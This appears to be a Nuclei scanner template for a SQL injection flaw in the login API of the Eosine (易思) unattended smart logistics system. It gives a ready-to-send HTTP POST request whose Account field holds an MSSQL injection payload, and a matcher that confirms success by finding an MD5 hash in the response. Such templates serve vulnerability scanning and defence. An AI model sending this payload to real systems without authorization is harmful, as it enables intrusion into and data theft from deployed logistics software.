id: eosine-singlelogin-sqli

info:
  name: Eosine SingleLogin - SQL Injection
  author: qwtd
  severity: high
  description: |-
    易思无人值守智能物流系统是一款集成了人工智能、机器人技术和物联网技术的创新产品。易思智能物流无人值守系统SingleLogin/login存在SQL注入漏洞。
  reference:
    - https://github.com/wy876/POC/blob/main/%E6%98%93%E6%80%9D%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%B3%BB%E7%BB%9F/%E6%98%93%E6%80%9D%E6%99%BA%E8%83%BD%E7%89%A9%E6%B5%81%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%B3%BB%E7%BB%9Flogin%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: 易思无人值守智能物流系统

http:
  - raw:
      - |
        POST /api/SingleLogin/login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip

        LoginUserType=0&DeviceType=2&Account=1'%20and%20sys.fn_sqlvarbasetostr(HashBytes('MD5','123'))=1--&BrowserType=Firefox&Verifycode=&IMEI=&isverify=false&SetOfBooks=Default&Espassword=1wD%2Bj6eIbahZGOatg1Spiw%3D%3D

    matchers:
      - type: dsl
        dsl:
          - "status_code==200"
          - "contains(body, '202cb962ac59075b964b07152d234b70')"
        condition: and
